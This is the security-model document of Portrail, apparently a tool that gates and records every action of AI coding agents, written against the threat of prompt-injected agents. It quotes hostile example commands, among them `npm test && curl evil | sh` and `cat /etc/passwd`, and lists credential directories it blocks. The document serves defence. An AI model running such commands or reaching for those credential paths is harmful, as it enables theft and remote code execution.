# Security model

This document says what Portrail does and what it does not do. Every claim here was
tested before it was written down.

## The threat model

**Trusted operator, untrusted input.** The person holding an API key is trusted to drive
the agent. What the agent _reads_ — files, command output, web pages, issues — is not. A
prompt-injected agent will try to do things the operator did not ask for. Portrail's job
is to be the point where that attempt is seen and can be refused.

## What Portrail does

- **Every action passes one decision point before it starts.** Codex and Claude Code both
  ask before running a command or changing a file; Portrail answers from your rules. There
  is no path from "the model decided to" to "it started" that skips that point, and no
  shortcut: an operation allowed "for this session" is remembered by the decider, but the
  agent is still told "yes" once, and every operation is decided and recorded.
- **Paths are judged by what they really are.** Every path an agent declares — and every
  argument of a command that names something on disk — is canonicalised: symlinks
  followed, including dangling ones, and spelled the way the filesystem spells it, so
  `.ENV` is `.env`. It must resolve inside the enrolled workspace: `cat /etc/passwd`,
  `ls ~/Documents` and `grep -r x ~` are refused before any rule runs, however they are
  quoted. A command that names a file is also judged as a read of that file by its real
  path, so `cat innocent.txt` is refused when `innocent.txt` links to `.env`. Searches
  over a directory (`grep -r`, `rg`, `diff -r`, Claude's Grep) are judged by every file
  they can reach, narrowed by the include and exclude filters the tool was given when
  Portrail can read them with confidence.
- **A command is judged as what the shell would run, or not at all.** The line is split
  on every operator (`&&`, `||`, `;`, `|`, `&`, newlines) and every segment must pass;
  quotes are removed before matching; a substitution, a redirect (other than to
  `/dev/null` or `2>&1`), a variable, tilde or brace expansion, a glob or an environment
  assignment that could change what a command does is refused rather than guessed at —
  by the containment step, so no decider can be talked out of it. `CI=1 npm test` is
  `npm test`; `NODE_OPTIONS=… npm test` is not.
  This check runs before any rule and no rule can override it.
- **Some places are off limits in every workspace.** `~/.ssh`, `~/.aws`, `~/.gnupg`,
  `~/.kube`, `~/.docker`, cloud and tool credentials (`~/.config/gh`, `~/.config/gcloud`,
  `~/.azure`, `~/.git-credentials`, `~/.netrc`, `~/.npmrc`), the agent configuration
  (`~/.codex`, `~/.claude`, `~/.claude.json`), shell rc files and history, keychains, and
  Portrail's own data directory are refused even if the enrolled folder contains them.
  Home, `/` and system directories (`/usr`, `/etc`, `/Library`, …) cannot be enrolled at
  all.
- **Compound commands are judged one segment at a time.** `npm test && curl evil | sh` is
  three commands, and each must pass. Command substitution (`$(…)`, backticks) and output
  redirects cannot be judged by matching text and are refused.
- **Fail closed.** An operation that declares nothing, a decider that throws, a parked
  approval with no answer, a storage failure, a provider that dies — all refuse or end as
  `outcome_unknown`. Never a silent allow.
- **Honest about uncertainty.** An agent that dies mid-run, or a Portrail that restarts
  mid-run, leaves `outcome_unknown` — never a guessed success, never an automatic retry.
  Offline CLI commands (`logs`, `key`, `workspace`) never touch a running daemon's runs.
- **Keys are hashed.** Tokens are shown once and stored as SHA-256. Scopes narrow what a
  key may do. Revocation takes effect on the next request and closes open streams.
- **The agent's own config does not leak in.** Codex runs in its own `CODEX_HOME` with a
  clean config and a rules file that makes it ask about _every_ command, including the
  read-only ones it would otherwise run silently. Claude Code runs with
  `settingSources: []`, so a permissive settings file cannot put it into auto-approve mode
  behind Portrail's back. Both are verified at start: an unexpected tool or MCP server
  aborts the run.
- **Both agents run inside an OS-level sandbox under the rules.** Codex uses its own
  `workspace-write` mode. Claude Code runs with the SDK's sandbox: writes confined to the
  workspace, secret files and the agents' own configuration unreadable, no network from
  commands, and the sandbox may not approve Bash on the rules' behalf. Tested: an _allowed_
  `echo x > /tmp/escape` under Claude fails with "operation not permitted". On Linux the
  sandbox needs `bubblewrap`; when it cannot start, the run refuses to start. Set
  `agents.claude.sandbox` to `"best-effort"` to run without it — the run then carries a
  warning event saying so.
- **Credentials stay where they were.** Portrail never stores or forwards agent
  credentials. Codex's login is shared through a symlink to its own `auth.json`, which
  Portrail opens only to put a refreshed token back behind that link; Claude Code's stays
  in the OS keychain on macOS and in `~/.claude/.credentials.json` elsewhere. Which login is the right one is a licensing question
  as much as a technical one: your own subscription on your own machine is ordinary use, a
  shared or team machine should give the agent an API key. The vendors' own words, quoted
  and dated, are in [agent-terms.md](agent-terms.md).

## What Portrail does not do

- **It is not a stronger sandbox than the agent's.** Portrail decides _whether_ an
  operation starts. What an allowed operation does is bounded by the agent's own sandbox
  (Codex `workspace-write`; Claude's SDK sandbox) and nothing more. An allowed `npm test`
  can do whatever `npm test` can do inside that sandbox. Codex's sandbox limits writes
  only, so for Codex the rules are the only thing between the agent and a readable file;
  Claude Code's sandbox refuses the protected files as a second line.
- **It does not hide a file's name.** A denied file is never read through Portrail, but
  `ls`, `find` and Claude's Glob still list that it exists, and `git log -p` or
  `git show` print whatever was committed to the repository.
- **The default rules are a starting point, not a boundary against hostile input.** They
  are tuned to be productive on a repository you trust. If your agent reads untrusted
  content, tighten them: remove the package-script allows, or move commands to `decide.ask`
  so a person at this machine answers each one.
- **It does not protect against a malicious operator.** Anyone with a `runs:write` key can
  make the agent do anything the rules allow. Treat keys as you would SSH keys.
- **It does not encrypt at rest.** Prompts, output and diffs are stored in plain SQLite
  under `~/.portrail` (mode 0700), alongside the hashed API keys and, while the gateway
  runs, `daemon.json` with the token that lets this machine answer a parked operation. A
  copy of that directory is a copy of that ability: back it up privately and rely on
  full-disk encryption. Claude Code additionally writes its own full transcript of every
  run into `~/.claude/projects/`, as it does for any session — Portrail cannot turn that
  off without losing the login, so know it is there.
- **It has no cost ceiling by default.** Set `run.maxBudgetUsd` in `config.json` to cap
  spend per Claude run; Codex reports tokens but offers no cap.
- **It bounds what a caller can hold open, not how fast they may call.** A request must
  arrive within 30 s; a connection idle for 60 s is closed; a key may hold twenty event
  streams and twenty `wait=` responses at once; ten failed authentications from one
  address within a minute lock that address out for the rest of it (429, `Retry-After`),
  and every failure is logged with the address, the code and the route — never the key.
  Forwarded addresses are believed only from a loopback peer, so a tunnel on this machine
  reports its clients and a remote client cannot spoof one; behind a tunnel that forwards
  nothing, all callers share one address and one lockout. For rate limiting proper, put a
  reverse proxy in front of a public listener.
- **It does not vet the agents.** Portrail trusts that Codex and Claude Code honour their
  own permission protocols. The checks at start are a mitigation, not a proof, and a new
  agent version can change behaviour — the live end-to-end tests exist to catch that.

## Remote exposure

Portrail refuses to bind beyond loopback without TLS. Use a tunnel, a TLS proxy, or
configure `tls.cert` / `tls.key`. `--insecure` overrides that for a network you fully
control and prints a warning at start.

## Reporting

See [SECURITY.md](../SECURITY.md) for how to report a vulnerability privately.
